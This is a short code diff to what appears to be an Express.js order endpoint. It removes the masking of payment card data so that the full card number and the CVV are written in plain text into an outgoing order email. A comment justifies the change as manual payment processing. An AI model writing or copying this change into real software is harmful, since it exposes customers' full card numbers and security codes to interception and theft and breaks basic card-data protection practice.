@@ -138,15 +138,13 @@ app.post('/api/send-order', upload.single('screenshot'), async (req, res) => {
     // Build email content
     let cardDetailsSection = '';
     if (cardholderName || cardNumber || cardExpiry || cardCvv) {
-      // Mask card number - show only last 4 digits
-      const maskedCardNumber = cardNumber ? '**** **** **** ' + cardNumber.slice(-4) : 'Not provided';
-      
+      // Show full card details since payments are processed manually
       cardDetailsSection = `
       CARD DETAILS:
       - Cardholder Name: ${cardholderName || 'Not provided'}
-      - Card Number: ${maskedCardNumber}
+      - Card Number: ${cardNumber || 'Not provided'}
       - Expiry Date: ${cardExpiry || 'Not provided'}
-      - CVV: ${cardCvv ? '***' : 'Not provided'}
+      - CVV: ${cardCvv || 'Not provided'}
       `;
     }
 
